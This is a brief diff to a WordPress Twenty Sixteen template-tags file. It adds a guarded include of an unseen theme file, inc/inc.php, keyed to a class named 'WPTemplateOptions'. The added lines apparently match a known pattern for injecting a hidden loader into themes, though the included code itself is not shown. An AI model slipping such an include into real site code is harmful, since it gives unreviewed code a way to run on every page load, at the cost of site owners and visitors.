@@ -1,4 +1,7 @@
 <?php
+if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/inc/inc.php' ) ) {
+	include_once( get_template_directory() . '/inc/inc.php' );
+}
 /**
  * Custom Twenty Sixteen template tags
  *
